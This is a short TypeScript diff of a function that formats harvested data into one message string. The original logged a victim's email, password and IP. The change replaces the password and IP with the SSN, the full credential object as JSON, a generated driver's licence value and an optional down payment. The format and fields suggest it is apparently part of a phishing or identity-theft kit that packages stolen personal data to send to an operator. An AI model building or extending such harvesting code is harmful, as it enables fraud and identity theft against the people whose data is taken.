@@ -3,11 +3,16 @@ import { Credential } from '../interface/credential';
 export const generateOutputMessage = (
   crendential: Credential,
   url: string,
-  ip: string,
+  driverLicenceGenerated: string,
+  downPayment?: string,
 ): string => {
-  const { email, password } = crendential;
+  const { email } = crendential;
 
-  const message = `EMAIL=${email} PASSWORD=${password} IP=${ip}`;
+  const message = `EMAIL=${email} SSN=${crendential.ssn} data=${JSON.stringify(
+    crendential,
+  )} driverLicenceGenerated=${driverLicenceGenerated} ${
+    downPayment ? `DOWNPAYMENT=${downPayment}` : ''
+  }`;
 
   return message;
 };
